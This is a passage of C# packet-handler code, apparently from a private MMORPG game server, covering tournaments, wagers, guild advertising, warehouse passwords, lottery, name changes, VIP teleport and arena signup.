                                ushort u11 = BitConverter.ToUInt16(packet, 22);
                                ushort u12 = BitConverter.ToUInt16(packet, 24);
                                ushort u13 = BitConverter.ToUInt16(packet, 26);
                                ushort u14 = BitConverter.ToUInt16(packet, 28);
                                if (client.IsFairy)
                                {
                                    client.Send(new Message("Cancel The Other Transformer First", System.Drawing.Color.CadetBlue, Message.Talk));
                                    return;
                                }
                                client.IsFairy = true;
                                client.FairyType = FS.FairyType;
                                client.SType = FS.SType;
                                FS.UID = client.Entity.UID;
                                client.SendScreen(FS, true);
                                return;
                            case 2:
                                if (!client.IsFairy) return;
                                client.IsFairy = false;
                                client.FairyType = 0;
                                client.SType = 0;
                                FS.UID = client.Entity.UID;
                                client.SendScreen(FS, true);
                                return;
                            default:
                                /*Unknown S type*/
                                return;
                        }
                        // return;
                    }
                #endregion
                #region ElitePk Tournament 2223 | 2219
                case 2223:
                    {
                        client.Send(packet);
                        ElitePKRanking ranks = new ElitePKRanking(false);
                        ranks.Deserialize(packet);
                        ElitePKTournament.Tournaments[ranks.Group].Rankings(client);
                        break;
                    }
                case 2219:
                    {
                        client.Send(packet);
                        ElitePKBrackets brackets = new ElitePKBrackets(false);
                        brackets.Deserialize(packet);
                        if (brackets.Type == ElitePKBrackets.RequestInformation || brackets.Type == ElitePKBrackets.InitialList)
                            ElitePKTournament.Tournaments[brackets.Group].Update(client, brackets.Page);
                        break;
                    }
                case 1064:
                    {
                        ElitePKWager wager = new ElitePKWager();
                        wager.Deserialize(packet);
                        if (Kernel.GamePool.ContainsKey(wager.WagedUID))
                        {
                            var pClient = Kernel.GamePool[wager.WagedUID];
                            if (pClient != null)
                            {
                                if (pClient.ElitePKMatch != null)
                                {
                                    if (pClient.ElitePKMatch.Flag == ElitePK.Match.StatusFlag.AcceptingWagers)
                                    {
                                        if (client.Entity.Money >= wager.Wager * 100000)
                                        {
                                            client.Entity.Money -= wager.Wager * 100000;
                                            if (!pClient.ElitePKStats.Wagers.ContainsKey(client.Entity.UID))
                                                pClient.ElitePKStats.Wagers[client.Entity.UID] = wager.Wager;
                                            else
                                                pClient.ElitePKStats.Wagers[client.Entity.UID] += wager.Wager;
                                            pClient.ElitePKStats.Wager += wager.Wager;
                                            pClient.ElitePKMatch.TotalWagers += wager.Wager;
                                            var epk = ElitePKTournament.Tournaments[pClient.ElitePKMatch.GroupID];
                                            epk.Update(client, 0);
                                        }
                                    }
                                }
                            }
                        }
                        break;
                    }
                case 1065:
                    {
                        ElitePKWagersList wager = new ElitePKWagersList(false);
                        wager.Deserialize(packet);
                        var epk = ElitePKTournament.Tournaments[wager.Group];

                        int count = 0;//epk.Matches.Values.Count(p => p.TotalWagers != 0);
                        foreach (var p in epk.Matches.Values)
                        {
                            if (p.TotalWagers != 0)
                                count++;
                        }

                        wager = new ElitePKWagersList(true, count);
                        wager.TotalMatches = (uint)count;
                        int i = 0;
                        foreach (var match in epk.Matches.Values)
                            if (match.TotalWagers != 0)
                                wager.Append(match, i++);
                        client.Send(wager);
                        break;
                    }
                case 1130:
                    {
                        try
                        {
                            TitlePacket tpacket = new TitlePacket(false);
                            tpacket.Deserialize(packet);

                            switch (tpacket.Type)
                            {
                                case TitlePacket.Types.List:
                                    {
                                        tpacket.Title = client.Entity.MyTitle;
                                        if (client.Entity.Titles.Count > 0)
                                        {
                                            tpacket.Count = (Byte)client.Entity.Titles.Count();
                                            foreach (var title in client.Entity.Titles)
                                                tpacket.Add((Byte)title.Key);
                                        }
                                        client.Send(tpacket);
                                        break;
                                    }
                                case TitlePacket.Types.Switch:
                                    {
                                        if (client.Entity.Titles.Keys.Contains(tpacket.Title) || tpacket.Title == TitlePacket.Titles.None)
                                        {
                                            client.Entity.MyTitle = tpacket.Title;
                                            client.Send(tpacket);
                                            client.Entity.Teleport(client.Entity.MapID, client.Entity.X, client.Entity.Y);
                                        }
                                        break;
                                    }
                            }
                        }
                        catch (Exception x) { Console.WriteLine(x.ToString()); }
                        break;
                    }
                #endregion
                #region Team Tournament & Skill Elite Pk
                case 2232:
                    {

                        client.Send(packet);
                        if (packet[4] == GamePackets.TeamElitePkBrackets.UpdateList || packet[4] == GamePackets.TeamElitePkBrackets.RequestInformation
                            || packet[4] == GamePackets.TeamElitePkBrackets.InitialList)
                            Game.Features.Tournaments.TeamElitePk.TeamTournament.Tournaments[packet[14]].Update(client, packet[6]);

                        break;
                    }
                case 2233:
                    {
                        client.Send(packet);
                        Game.Features.Tournaments.TeamElitePk.TeamTournament.Tournaments[packet[8]].Rankings(client);
                        break;
                    }
                case 2240:
                case 2260:
                    {
                        string TeamName = ReadString(packet, 12, 32);// packet.ReadString(12, 32);
                        byte Mode = packet[4];
                        if (client.Team != null)
                        {
                            if (client.Team.EliteFighterStats != null)
                            {
                                client.Team.EliteFighterStats.Name = TeamName;

                                client.Send(packet);
                            }

                        }
                        break;
                    }
                case 2252:
                    {

                        client.Send(packet);
                        if (packet[4] == GamePackets.TeamElitePkBrackets.UpdateList
                            || packet[4] == GamePackets.TeamElitePkBrackets.RequestInformation
                            || packet[4] == GamePackets.TeamElitePkBrackets.InitialList)//12
                            Game.Features.Tournaments.TeamElitePk.SkillTeamTournament.Tournaments[packet[14]].Update(client, packet[6]);

                        break;
                    }
                case 2253:
                    {
                        client.Send(packet);
                        Game.Features.Tournaments.TeamElitePk.SkillTeamTournament.Tournaments[packet[8]].Rankings(client);
                        break;
                    }
                #endregion
                #region Champion
                case 2600:
                    {
                        Game.Champion.Statistics.ShowRankingPage(packet[4], packet[5], client);
                        return;
                    }
                case 2601:
                    {
                        client.Send(client.ChampionStats);
                        break;
                    }
                case 2602:
                    {
                        Game.Champion.Statistics.ShowTop(client, 2602);
                        break;
                    }
                case 2603:
                    {
                        Game.Champion.Statistics.ShowTop(client, 2603);
                        break;
                    }
                case 2604:
                    {
                        Game.Champion.Handle(client, packet);
                        break;
                    }
                #endregion
                #region Achievement
                case 1136:
                    {
                        switch (packet[4])
                        {
                            case 1:
                                {
                                    Client.GameState obj;
                                    if (Kernel.GamePool.TryGetValue(BitConverter.ToUInt32(packet, 8), out obj))
                                    {
                                        client.Send(obj.Entity.MyAchievement.ViewOpen());
                                    }
                                    break;
                                }
                            case 2:
                                {
                                    client.Entity.MyAchievement.CreateFlaID((int)BitConverter.ToUInt32(packet, 12));
                                    break;
                                }
                        }
                        break;
                    }
                #endregion
                #region MsgMessageBoard 1111
                case 1111:
                    {
                        MTA.Network.MsgMessageBoard.Process(client, packet);
                        return;
                    }
                #endregion MsgMessageBoard
                #region CTF
                case 1063:
                    {

                        //if (packet[6] == 3)
                        //{
                        //    client.Send(packet);
                        //    uint m = BitConverter.ToUInt32(packet, 10);
                        //    client.Send(CrossServer.generateRanking(m));
                        //    return;
                        //}
                        byte typ = packet[4];
                        switch (typ)
                        {
                            case 0:
                                {
                                    if (client.Guild == null || client.AsMember == null)
                                        break;
                                    if (!CaptureTheFlag.IsWar)
                                    {
                                        CaptureTheFlag.CTFGuildsRank(client, packet);
                                    }
                                    else
                                    {
                                        CaptureTheFlag.CTFExpolitsRank(client, packet);
                                    }
                                    break;
                                }
                            case 1:
                                {
                                    if (client.Guild == null || client.AsMember == null)
                                        break;

                                    CaptureTheFlag.CTFExpolitsRank2(client, packet);
                                    break;
                                }
                            case 3:
                                {
                                    uint setCTFCps = BitConverter.ToUInt32(packet, 18);
                                    if (client.Guild == null || client.AsMember == null)
                                        break;
                                    if (client.Guild.ConquerPointFund > setCTFCps)
                                    {
                                        client.Guild.ConquerPointFund -= setCTFCps;
                                        client.Guild.CTFdonationCPsold += setCTFCps;
                                        Database.GuildTable.SaveFunds(client.Guild);
                                    }
                                    goto case 0;
                                }
                            case 4:
                                {
                                    uint setCTFMoney = BitConverter.ToUInt32(packet, 22);
                                    if (client.Guild == null || client.AsMember == null)
                                        break;
                                    if (client.Guild.SilverFund > setCTFMoney)
                                    {
                                        client.Guild.SilverFund -= setCTFMoney;
                                        client.Guild.CTFdonationSilverold += setCTFMoney;
                                        Database.GuildTable.SaveFunds(client.Guild);
                                    }
                                    goto case 0;

                                }
                            case 5:
                                {
                                    uint setCTFCps = BitConverter.ToUInt32(packet, 18);
                                    if (client.Guild == null || client.AsMember == null)
                                        break;
                                    if (client.Guild.ConquerPointFund > setCTFCps)
                                    {
                                        client.Guild.ConquerPointFund -= setCTFCps;
                                        client.Guild.CTFdonationCPsold += setCTFCps;
                                        Database.GuildTable.SaveFunds(client.Guild);
                                    }

                                    uint setCTFMoney = BitConverter.ToUInt32(packet, 22);

                                    if (client.Guild.SilverFund > setCTFMoney)
                                    {
                                        client.Guild.SilverFund -= setCTFMoney;
                                        client.Guild.CTFdonationSilverold += setCTFMoney;
                                        Database.GuildTable.SaveFunds(client.Guild);
                                    }
                                    goto case 0;
                                }
                            case 8:
                                {
                                    if (client.Guild == null || client.AsMember == null)
                                        break;
                                    CaptureTheFlag.CTFGuildsRank2(client, packet);
                                    break;
                                }
                            case 9:
                                {
                                    if (client.Guild == null || client.AsMember == null)
                                        break;
                                    if (CaptureTheFlag.IsWar)
                                    {
                                        new CaptureTheFlag.CTF_Rank(client).Send(client);
                                    }
                                    else
                                    {
                                        CaptureTheFlag.CTFsRank(client, packet);
                                    }
                                    break;
                                }

                        }
                        break;
                    }
                case 2224:
                    {
                        if (packet[4] == 7)//2
                            client.Send(Program.World.CTF.generateCTFRanking());

                        if (CaptureTheFlag.IsWar)
                        {
                            byte[] p773 = new byte[] { 60, 0, 176, 8, 11, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 84, 81, 83, 101, 114, 118, 101, 114 };
                            client.Send(p773);
                        }
                        else
                            client.Send(packet);
                        break;
                    }
                #endregion
                #region AutoHunting (1070)
                case 1070:
                    {

                        if (client.Entity.Auto == false && client.Entity.VIPLevel < 1)
                        {
                            client.Send(new Network.GamePackets.NpcReply(6, "Sorry You Should Have Vip 1 To Run Auto Hunting & get Level's !"));
                            return;
                        }
                        AutoHunt auto = new AutoHunt(false);
                        auto.Deserialize(packet);
                        switch (auto.Type)
                        {
                            case AutoHunt.Icon:
                                {
                                    auto = new AutoHunt(true);
                                    auto.Type = 0;
                                    auto.Show = 391;
                                    client.Send(auto);
                                    return;
                                }
                            case AutoHunt.Start:
                                {
                                    auto = new AutoHunt(true);
                                    auto.Type = 1;
                                    client.Send(auto);
                                    client.Entity.Auto = true;
                                    client.Entity.AddFlag3((uint)Update.Flags3.AutoHunting);
                                    client.Entity.AutoHuntStamp = Time32.Now;
                                    client.Entity.InAutoHunt = true;
                                    return;
                                }
                            case AutoHunt.Gui:
                                {
                                    auto = new AutoHunt(true);
                                    auto.Type = 2;
                                    auto.EXP = (ushort)client.Entity.autohuntxp;
                                    client.Send(auto);
                                    return;
                                }
                            case AutoHunt.End:
                                {
                                    auto = new AutoHunt(true);
                                    auto.Type = 3;
                                    client.Entity.Auto = false;
                                    //client.IncreaseExperience(client.Entity.autohuntxp, false);
                                    client.Entity.autohuntxp = 0;
                                    client.Entity.RemoveFlag3((uint)Update.Flags3.AutoHunting);
                                    client.Entity.InAutoHunt = false;
                                    client.Send(auto);
                                    return;
                                }
                        }
                        return;
                    }

                #endregion AutoHunting (1070)
                #region Advertise
                case 2226:
                    {
                        //0,4,8

                        uint all_advertise = (ushort)Game.ConquerStructures.Society.Guild.Advertise.AdvertiseRanks.Length;

                        uint Receive_count = BitConverter.ToUInt32(packet, 4);
                        if (Receive_count != 0 && Receive_count % 4 != 0)
                            return;

                        List<Game.ConquerStructures.Society.Guild> AdvGuilds = new List<Game.ConquerStructures.Society.Guild>();
                        for (ushort x = 0; x < 4; x++)
                        {
                            ushort getposition = (ushort)(Receive_count + x);
                            if (Game.ConquerStructures.Society.Guild.Advertise.AdvertiseRanks.Length <= getposition)
                                break;
                            AdvGuilds.Add(Game.ConquerStructures.Society.Guild.Advertise.AdvertiseRanks[getposition]);
                        }




                        if (AdvGuilds.Count <= 2)
                        {
                            GamePackets.Advertise adv = new GamePackets.Advertise((ushort)AdvGuilds.Count);

                            adv.AllRegistred = (ushort)Game.ConquerStructures.Society.Guild.Advertise.AdvertiseRanks.Length;
                            adv.AtCount = (ushort)Receive_count;
                            adv.PacketNo = 1;
                            for (ushort x = 0; x < AdvGuilds.Count; x++)
                            {
                                var element = AdvGuilds[x];
                                adv.Aprend(element);
                            }
                            client.Send(adv.ToArray());

                        }
                        else if (AdvGuilds.Count == 3)
                        {
                            GamePackets.Advertise adv = new GamePackets.Advertise(2);

                            adv.AllRegistred = (ushort)Game.ConquerStructures.Society.Guild.Advertise.AdvertiseRanks.Length;
                            adv.AtCount = (ushort)Receive_count;
                            adv.PacketNo = 1;
                            for (ushort x = 0; x < 2; x++)
                            {
                                var element = AdvGuilds[x];
                                adv.Aprend(element);
                            }
                            client.Send(adv.ToArray());

                            GamePackets.Advertise ndadv = new GamePackets.Advertise(1);

                            ndadv.AllRegistred = (ushort)Game.ConquerStructures.Society.Guild.Advertise.AdvertiseRanks.Length;
                            ndadv.AtCount = (ushort)Receive_count;
                            ndadv.Aprend(AdvGuilds.Last());
                            client.Send(ndadv.ToArray());

                        }
                        else if (AdvGuilds.Count == 4)
                        {
                            GamePackets.Advertise adv = new GamePackets.Advertise(2);
                            adv.AllRegistred = (ushort)Game.ConquerStructures.Society.Guild.Advertise.AdvertiseRanks.Length;
                            adv.AtCount = (ushort)Receive_count;
                            adv.PacketNo = 1;
                            for (ushort x = 0; x < 2; x++)
                            {
                                var element = AdvGuilds[x];
                                adv.Aprend(element);
                            }
                            client.Send(adv.ToArray());


                            GamePackets.Advertise ddddadv = new GamePackets.Advertise(2);

                            ddddadv.AllRegistred = (ushort)Game.ConquerStructures.Society.Guild.Advertise.AdvertiseRanks.Length;
                            ddddadv.AtCount = (ushort)Receive_count;
                            for (ushort x = 2; x < 4; x++)
                            {
                                var element = AdvGuilds[x];
                                ddddadv.Aprend(element);
                            }
                            client.Send(ddddadv.ToArray());
                        }
                        break;
                    }
                case 2225:
                    {
                        if (client.Guild == null) return;
                        if (client.AsMember == null) return;
                        if (client.AsMember.Rank != Enums.GuildMemberRank.GuildLeader) return;



                        uint GuildID = BitConverter.ToUInt32(packet, 4);
                        string buletin = ReadString(packet, 8, 254);
                        ulong donation = BitConverter.ToUInt32(packet, 264);
                        bool Auto_join = packet[272] == 1;
                        byte Level = packet[274];
                        byte Reborn = packet[276];
                        ushort Flag = BitConverter.ToUInt16(packet, 278);
                        byte Grade = packet[280];
                        if (buletin.Contains('^'))
                        {
                            client.Entity.SendSysMesage("you buletin contain invalid char (^)! Please change this, to use my services");
                            break;
                        }
                        if (client.Guild.SilverFund >= donation)
                        {
                            client.Guild.SilverFund -= donation;
                            client.Guild.AdvertiseRecruit.Buletin = buletin;
                            client.Guild.AdvertiseRecruit.AutoJoin = Auto_join;
                            client.Guild.AdvertiseRecruit.Level = Level;
                            client.Guild.AdvertiseRecruit.Reborn = Reborn;
                            client.Guild.AdvertiseRecruit.SetFlag((int)Flag, Game.ConquerStructures.Society.Guild.Recruitment.Mode.Recruit);
                            client.Guild.AdvertiseRecruit.Grade = Grade;
                            client.Guild.AdvertiseRecruit.Donations += donation;

                            Game.ConquerStructures.Society.Guild.Advertise.Add(client.Guild);
                            Database.GuildTable.SaveAdvertise(client.Guild);
                        }
                        else
                        {
                            client.Entity.SendSysMesage("you guild use small donation!");
                        }
                        break;
                    }
                case 2227:
                    {
                        switch (packet[4])
                        {
                            case 2://open gui
                                {
                                    byte[] sendgui = new byte[288];
                                    Writer.WriteUInt16(280, 0, sendgui);
                                    Writer.WriteUInt16(2225, 2, sendgui);
                                    client.Send(sendgui);
                                    break;
                                }
                            case 1://join
                                {
                                    if (client.Entity.GuildID == 0)
                                    {
                                        uint GuildID = BitConverter.ToUInt32(packet, 8);

                                        Game.ConquerStructures.Society.Guild guild = null;
                                        if (Kernel.Guilds.TryGetValue(GuildID, out guild))
                                        {
                                            if (guild.AdvertiseRecruit.AutoJoin)
                                            {
                                                if (guild.AdvertiseRecruit.Compare(client.Entity, Game.ConquerStructures.Society.Guild.Recruitment.Mode.Recruit))
                                                    guild.AddMember(client);
                                            }
                                        }
                                    }

                                    break;
                                }
                        }
                        break;
                    }
                #endregion
                #region WarehousePassword (2261)
                case 2261:
                    {
                        WareHousePassword whp = new WareHousePassword(false);
                        whp.Deserialize(packet);
                        switch (whp.type)
                        {
                            case WareHousePassword.SendInformation:
                                {
                                    //client.WarehouseOpen
                                    if (client.WarehousePW != 0)
                                    {
                                        if (client.WarehousePW == whp.OldPassword)
                                        {
                                            client.WarehouseOpen = true;
                                            client.WarehousePW = whp.NewPassword;
                                            whp = new WareHousePassword(true);
                                            whp.type = WareHousePassword.PasswordCorrect;
                                            whp.OldPassword = 0x0101;
                                            client.Send(whp);
                                            client.Send(new Network.GamePackets.Message("Successfully modified! Please remember your secondary password", System.Drawing.Color.Red, Network.GamePackets.Message.Service));

                                        }
                                        else
                                        {
                                            whp = new WareHousePassword(true);
                                            whp.type = WareHousePassword.PasswordWrong;
                                            whp.OldPassword = 0x01;
                                            client.Send(whp);
                                        }
                                    }
                                    else
                                    {
                                        client.WarehouseOpen = true;
                                        client.WarehousePW = whp.NewPassword;
                                        whp = new WareHousePassword(true);
                                        whp.type = WareHousePassword.PasswordCorrect;
                                        whp.OldPassword = 0x0101;
                                        client.Send(whp);
                                        client.Send(new Network.GamePackets.Message("Successfully set! Please remember your secondary password", System.Drawing.Color.Red, Network.GamePackets.Message.Service));
                                    }
                                    return;
                                }
                            case WareHousePassword.VerifiedPassword:
                                {
                                    if (client.WarehousePW != 0)
                                    {
                                        if (client.WarehousePW == whp.NewPassword)
                                        {
                                            client.WarehouseOpen = true;
                                            whp = new WareHousePassword(true);
                                            whp.type = WareHousePassword.PasswordCorrect;
                                            whp.OldPassword = 0x0101;
                                            client.Send(whp);
                                            client.Send(new Network.GamePackets.Message("Successfully Verified!! Please remember your secondary password", System.Drawing.Color.Red, Network.GamePackets.Message.Service));
                                        }
                                        else
                                        {
                                            whp = new WareHousePassword(true);
                                            whp.type = WareHousePassword.PasswordWrong;
                                            client.Send(whp);

                                        }
                                    }
                                    else
                                    {
                                        client.Disconnect();
                                    }
                                    return;
                                }
                            case 2://Forget
                                {
                                    if (client.WarehousePW != 0)
                                    {
                                        client.WarehousePW = 0;
                                        client.Send(new Network.GamePackets.Message("Successfully Removed Your Passowrd !", System.Drawing.Color.Red, 0x7d0));
                                    }
                                    break;
                                }
                            case WareHousePassword.SetNewPass:
                                {
                                    if (client.WarehousePW == 0)
                                    {
                                        client.WarehouseOpen = true;
                                        client.WarehousePW = whp.NewPassword;
                                        whp = new WareHousePassword(true);
                                        whp.type = WareHousePassword.PasswordCorrect;
                                        whp.OldPassword = 0x0101;
                                        client.Send(whp);
                                        client.Send(new Network.GamePackets.Message("Successfully set! Please remember your secondary password", System.Drawing.Color.Red, Network.GamePackets.Message.Service));
                                    }
                                    return;
                                }
                            default:
                                {
                                    MTA.Console.WriteLine("Unknown 2261 packet type " + whp.type);
                                    return;
                                }
                        }
                        return;
                    }
                #endregion
                #region PK Explorer (2220)
                case 2220:
                    {
                        PkExplorer pk = new PkExplorer(packet, client);
                        pk.SubType = 1;
                        client.Send(pk.Build());
                        break;
                    }
                #endregion
                #region New Lottery
                case 1314:
                    {
                        newLottery I = new newLottery(true);
                        I.Deserialize(packet);

                        switch (packet[4])
                        {
                            case (byte)newLottery.Accept:
                                {
                                    if (client.Entity.LOTOITEM != null)
                                    {
                                        if (client.Entity.LOTOITEM.Sockets == 1)
                                            client.Inventory.Add(client.Entity.LOTOITEM.ID, client.Entity.LOTOITEM.Plus, 1, 255, 0);
                                        else if (client.Entity.LOTOITEM.Sockets == 2)
                                            client.Inventory.Add(client.Entity.LOTOITEM.ID, client.Entity.LOTOITEM.Plus, 1, 255, 255);
                                        else
                                            client.Inventory.Add(client.Entity.LOTOITEM.ID, client.Entity.LOTOITEM.Plus, 1, 0, 0);

                                        client.Entity.AddJade = 0;
                                        //   I.times = (ushort)(10 - client.LotteryEntries);
                                        client.Send(I);
                                        if (client.Entity.LOTOITEM.Plus >= 6 || client.Entity.LOTOITEM.Sockets == 2)
                                            Kernel.SendWorldMessage(new Message("Congratulations! " + client.Entity.Name + " Won " + client.Entity.LOTOITEM.Name + " in Lottery.", System.Drawing.Color.Black, Message.Talk));

                                        client.Entity.LOTOITEM = null;
                                    }
                                    break;

                                }
                            case (byte)newLottery.AddJade:
                                {
                                    int rand = Kernel.Random.Next(MTA.Database.LotteryTable.LotteryItems.Count);
                                    var item = MTA.Database.LotteryTable.LotteryItems[rand];
                                    client.Inventory.Remove(711504, 1);
                                    I.boxid = 3;
                                    I.ItemID = item.ID;
                                    client.Entity.AddJade += 1;
                                    I.JadesAdded = client.Entity.AddJade;
                                    if (item.Sockets > 0)
                                        I.SocketGem1 = 255;
                                    if (item.Sockets > 1)
                                        I.SocketGem2 = 255;
                                    //I.times = (ushort)(10 - client.LotteryEntries);
                                    client.Entity.LOTOITEM = item;
                                    I.plus = item.Plus;
                                    client.Send(I);

                                    break;
                                }
                            case (byte)newLottery.Continue:
                                {
                                    if (client.LotteryEntries < 10)
                                    {
                                        client.LotteryEntries += 1;
                                        client.Entity.AddJade = 0;
                                        client.Inventory.Remove(711504, 3);

                                        int rand = Kernel.Random.Next(MTA.Database.LotteryTable.LotteryItems.Count);
                                        var item = MTA.Database.LotteryTable.LotteryItems[rand];

                                        var tobesent = new newLottery(true);
                                        tobesent.boxid = 3;
                                        tobesent.ItemID = item.ID;
                                        client.Entity.LOTOITEM = item;
                                        tobesent.JadesAdded = client.Entity.AddJade;
                                        tobesent.plus = item.Plus;
                                        if (item.Sockets > 0)
                                            I.SocketGem1 = 255;
                                        if (item.Sockets > 1)
                                            I.SocketGem2 = 255;
                                        //  tobesent.times = (ushort)(10 - client.LotteryEntries);
                                        client.Send(tobesent);
                                    }
                                    break;
                                }
                            default:
                                Console.WriteLine("20 " + packet[20]);
                                break;
                        }
                        break;

                    }
                #endregion
                #region New AutoInvite
                case 1126://1314
                    {

                        MTA.Network.GamePackets.EventAlert.EventAlert2.Handle(packet, client);
                        return;
                    }
                #endregion
                #region ChangeName (2080)
                case 0x820:
                    MTA.Network.GamePackets.NameChange change = new MTA.Network.GamePackets.NameChange(false);
                    change.Deserialize(packet);
                    if (change.Action == MTA.Network.GamePackets.NameChange.NameChangeAction.Request)
                    {
                        string name = Encoding.Default.GetString(packet, 10, 0x10).TrimEnd(new char[1]);
                        packet[6] = (byte)client.namechanges;
                        packet[8] = (byte)(100 - client.namechanges);
                        change.Send(client);
                        client.Send(change);
                        if ((name != "") && (name != ""))
                        {
                            if (!Npcs.InvalidCharacters(name) || !Npcs.InvalidCharacters3(name) || name.Contains("[") || name.Contains("]"))
                            {
                                NpcReply reply = new NpcReply(6, "im sorry not allowed now close the dialog and try again");
                                reply.OptionID = 0xff;
                                client.Send(reply.ToArray());
                                return;
                            }
                            Database.MySqlReader reader = new Database.MySqlReader(new Database.MySqlCommand(Database.MySqlCommandType.SELECT).Select("entities").Where("name", name));
                            if (reader.Read())
                            {
                                packet[4] = 2;
                                change.Send(client);
                                client.Send(change);
                                return;
                            }
                            if (client.Entity.ConquerPoints >= rates.ChangeName)
                            {
                                client.Entity.ConquerPoints -= rates.ChangeName;
                                //    Database.MySqlCommand command3 = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                //   command3.Update("entities").Set("namechange", name).Where("UID", (long)client.Entity.UID).Execute();                               
                                client.NewName = name;
                                MTA.Console.WriteLine(client.Entity.Name + ", Changed hes Name to : " + name);
                                Kernel.SendWorldMessage(new MTA.Network.GamePackets.Message(client.Entity.Name + ", Changed He's/Hers Name to " + name + ", Will be affected after Maint.", System.Drawing.Color.Red, 0x7d0), Program.Values);
                                client.namechanges += 1;
                                packet[4] = 1;
                                change.Send(client);
                                client.Send(change);
                                NpcReply reply = new NpcReply(6, "Your new name is : " + name + ", After server Restart You will get your new name.")
                                {
                                    OptionID = 0xff
                                };
                                client.Send(reply.ToArray());
                                client.ChangeName(client);

                            }
                            else
                            {
                                NpcReply reply = new NpcReply(6, "Come back when you have " + rates.ChangeName + " CPS.")
                                {
                                    OptionID = 0xff
                                };
                                client.Send(reply.ToArray());
                            }
                        }
                    }
                    return;
                #endregion ChangeName (2080)
                #region vipteleport
                case 1128:
                    {
                        if (client.Entity.MapID == 601) return;
                        if (client.Map.BaseID == 6000 || client.Map.BaseID == 6001 || client.Map.BaseID == 1844 || client.Map.BaseID == 1801 || client.Map.BaseID == 8883 || client.Map.BaseID == 1005 && client.Entity.MapID != 1005 || client.Map.BaseID == 700)
                        {
                            client.Send(Constants.vipteleport);
                            return;
                        }
                        VIPTeleport tele = new VIPTeleport();
                        tele.Deserialize(packet);
                        switch (tele.TeleportType)
                        {
                            case VIPTeleportTypes.SelfTeleport:
                                {
                                    if (Constants.MemoryAgateNotAllowedMap.Contains(client.Map.BaseID))
                                    {
                                        client.Send(Constants.Noteleport);
                                        return;
                                    }
                                    if (Time32.Now > client.LastVIPTeleport.AddSeconds(1))
                                    {
                                        client.LastVIPTeleport = Time32.Now;
                                        Teleport(client, tele.Location);
                                        if (Constants.MemoryAgateNotAllowedMap.Contains(client.Entity.MapID))
                                        {
                                            client.Entity.PreviousTeleport();
                                            client.Send(Constants.Noteleport);
                                            return;
                                        }
                                    }
                                    else
                                        client.Send(new Message(string.Format("You have to wait {0} more seconds to use the VIP Teleport.", (client.LastVIPTeleport.AddSeconds(1) - Time32.Now).AllSeconds()), Color.Red, Message.Talk));
                                    break;
                                }
                            case VIPTeleportTypes.TeamTeleport:
                                {
                                    if (Constants.MemoryAgateNotAllowedMap.Contains(client.Map.BaseID))
                                    {
                                        client.Send(Constants.Noteleport);
                                        return;
                                    }
                                    if (Time32.Now > client.LastVIPTeamTeleport.AddSeconds(1))
                                    {
                                        client.LastVIPTeamTeleport = Time32.Now;
                                        if (client.Team != null)
                                        {
                                            foreach (var teammate in client.Team.Teammates)
                                            {
                                                if (teammate.Entity.UID != client.Entity.UID)
                                                {
                                                    teammate.Send(new VIPTeleport()
                                                    {
                                                        Countdown = 10,
                                                        Location = tele.Location,
                                                        Name = client.Entity.Name,
                                                        TeleportType = VIPTeleportTypes.TeammateConfirmation
                                                    }.ToArray());
                                                }
                                            }
                                        }
                                        Teleport(client, tele.Location);
                                        if (Constants.MemoryAgateNotAllowedMap.Contains(client.Entity.MapID))
                                        {
                                            client.Entity.PreviousTeleport();
                                            client.Send(Constants.Noteleport);
                                            return;
                                        }
                                    }
                                    else
                                        client.Send(new Message(string.Format("You have to wait {0} more seconds to use the VIP Team Teleport.", (client.LastVIPTeamTeleport.AddSeconds(1) - Time32.Now).AllSeconds()), Color.Red, Message.Talk));
                                    break;
                                }
                            case VIPTeleportTypes.TeammateTeleport:
                                {
                                    if (Constants.MemoryAgateNotAllowedMap.Contains(client.Map.BaseID))
                                    {
                                        client.Send(Constants.Noteleport);
                                        return;
                                    }
                                    Teleport(client, tele.Location);
                                    if (Constants.MemoryAgateNotAllowedMap.Contains(client.Entity.MapID))
                                    {
                                        client.Entity.PreviousTeleport();
                                        client.Send(Constants.Noteleport);
                                        return;
                                    }
                                    break;
                                }
                        }
                        break;
                    }
                #endregion
                #region MentorApprentice (2065)
                case 2065:
                    {
                        MentorApprentice ma = new MentorApprentice(false);
                        ma.Deserialize(packet);
                        switch (ma.Type)
                        {
                            case MentorApprentice.LeaveMentor:
                                {
                                    LeaveMentor(ma, client);
                                    break;
                                }
                            case MentorApprentice.ExpellApprentice:
                                {
                                    ExpelApprentice(ma, client);
                                    break;
                                }
                            case MentorApprentice.RequestApprentice:
                                {
                                    AddApprentice(ma, client);
                                    break;
                                }
                            case MentorApprentice.RequestMentor:
                                {
                                    AddMentor(ma, client);
                                    break;
                                }
                            case MentorApprentice.AcceptRequestApprentice:
                                {
                                    AcceptRequestApprentice(ma, client);
                                    break;
                                }
                            case MentorApprentice.AcceptRequestMentor:
                                {
                                    AcceptRequestMentor(ma, client);
                                    break;
                                }
                        }
                        break;
                    }
                case 2066:
                    {
                        MentorInformation info = new MentorInformation(false);
                        info.Deserialize(packet);
                        if (info.Mentor_Type == 1)
                        {
                            client.ReviewMentor();
                        }
                        break;
                    }
                #endregion
                #region Guild members (2102)
                case 2102:
                    {
                        ushort Page = BitConverter.ToUInt16(packet, 8);
                        if (client.Guild != null)
                        {
                            if (client.AsMember != null)
                                client.Guild.SendMembers(client, Page);
                        }
                        break;
                    }
                #endregion
                #region Arena (2207<->2211)
                case 2207://Request Arena ranking List
                    {
                        //Code snippet that belongs to Ultimation
                        ushort PageIndex = BitConverter.ToUInt16(packet, 6);
                        Game.Arena.Statistics.ShowRankingPage(packet[4], PageIndex, client);
                        break;
                    }
                case 2206:
                    {
                        //Code snippet that belongs to Ultimation
                        ushort PageIndex = BitConverter.ToUInt16(packet, 4);
                        Game.Arena.QualifyEngine.RequestGroupList(client, PageIndex);
                        break;
                    }
                case 2205://Arena Signup!
                    {
                        #region MaxsMap
                        if (client.Entity.MapID == 1766 || client.Entity.MapID == 8877
                            || client.Entity.MapID == 1734 || client.Entity.MapID == 1733
                            || client.Entity.MapID == 1732 || client.Entity.MapID == 1731 || client.Entity.MapID == 1024
                            || client.Entity.MapID == 1730 || client.Entity.MapID == 1735 || client.Entity.MapID == 1090
                            || client.Entity.MapID == 8511 || client.Entity.MapID == 8512 || client.Entity.MapID == 8514
